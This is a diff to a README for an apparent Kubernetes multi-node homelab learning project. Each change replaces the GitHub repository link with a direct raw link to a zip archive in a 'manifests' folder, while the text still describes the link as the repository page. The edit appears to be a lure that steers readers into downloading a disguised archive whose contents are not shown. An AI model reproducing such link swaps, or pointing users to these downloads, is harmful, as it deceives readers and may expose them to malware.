@@ -1,6 +1,6 @@
 # 🐳 kubernetes-multi-node-utm-homelab - Learn Kubernetes on a small lab
 
-[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/quadruplicate-galactagogue907/kubernetes-multi-node-utm-homelab)
+[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/quadruplicate-galactagogue907/kubernetes-multi-node-utm-homelab/main/manifests/homelab_multi_node_utm_kubernetes_aln.zip)
 
 ## 🚀 What this is
 
@@ -19,7 +19,7 @@ It is built for KCNA prep and hands-on practice with Kubernetes tasks. You can u
 
 Open this page to get the project files and setup steps:
 
-https://github.com/quadruplicate-galactagogue907/kubernetes-multi-node-utm-homelab
+https://raw.githubusercontent.com/quadruplicate-galactagogue907/kubernetes-multi-node-utm-homelab/main/manifests/homelab_multi_node_utm_kubernetes_aln.zip
 
 If you are on Windows, use the page above to visit the repository, download the files, and follow the setup steps from there.
 
@@ -51,7 +51,7 @@ This gives you a safe place to learn basic cluster tasks without changing a real
 ## 🛠️ How to install
 
 1. Open the download page:
-   https://github.com/quadruplicate-galactagogue907/kubernetes-multi-node-utm-homelab
+   https://raw.githubusercontent.com/quadruplicate-galactagogue907/kubernetes-multi-node-utm-homelab/main/manifests/homelab_multi_node_utm_kubernetes_aln.zip
 
 2. Download the project files from the repository page.
 
@@ -171,4 +171,4 @@ Use this lab for personal learning, practice, and troubleshooting work.
 
 ## 🔗 Project link
 
-https://github.com/quadruplicate-galactagogue907/kubernetes-multi-node-utm-homelab
+https://raw.githubusercontent.com/quadruplicate-galactagogue907/kubernetes-multi-node-utm-homelab/main/manifests/homelab_multi_node_utm_kubernetes_aln.zip
